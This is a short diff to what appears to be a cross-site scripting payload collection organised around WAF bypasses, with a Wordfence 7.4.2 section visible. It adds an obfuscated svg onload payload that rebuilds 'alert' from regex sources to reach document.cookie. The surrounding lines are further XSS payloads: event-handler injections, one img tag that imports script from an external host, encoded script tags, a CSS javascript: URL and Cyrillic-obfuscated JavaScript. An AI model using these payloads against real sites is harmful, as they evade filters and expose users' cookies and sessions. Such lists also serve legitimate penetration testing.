@@ -76,6 +76,7 @@ onfocus=alert%26#40document.domain%26#41+autofocus+tabindex=1
 <svg onload=alert&#0000000040document.cookie)>
 <svg onload=alert&#0000000040"1")><””>
 <Img Src=//14.rs OnLoad%0C=import(Src)>
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
 background-color:#f00;background:url("javascript:alert(document.domain);");
 \\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
 \\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
@@ -1746,4 +1747,5 @@ Wordfence 7.4.2
 <lol/contenteditable/autofocus/onfocus="alert(1)">
 а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],
 з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+
 
